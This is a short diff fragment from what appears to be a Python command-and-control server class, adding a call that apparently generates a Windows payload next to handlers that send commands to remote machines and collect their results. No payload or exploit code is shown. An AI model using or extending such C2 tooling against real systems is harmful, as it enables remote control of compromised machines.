@@ -20,6 +20,7 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
+        self.generate("Windows")
 
 
 
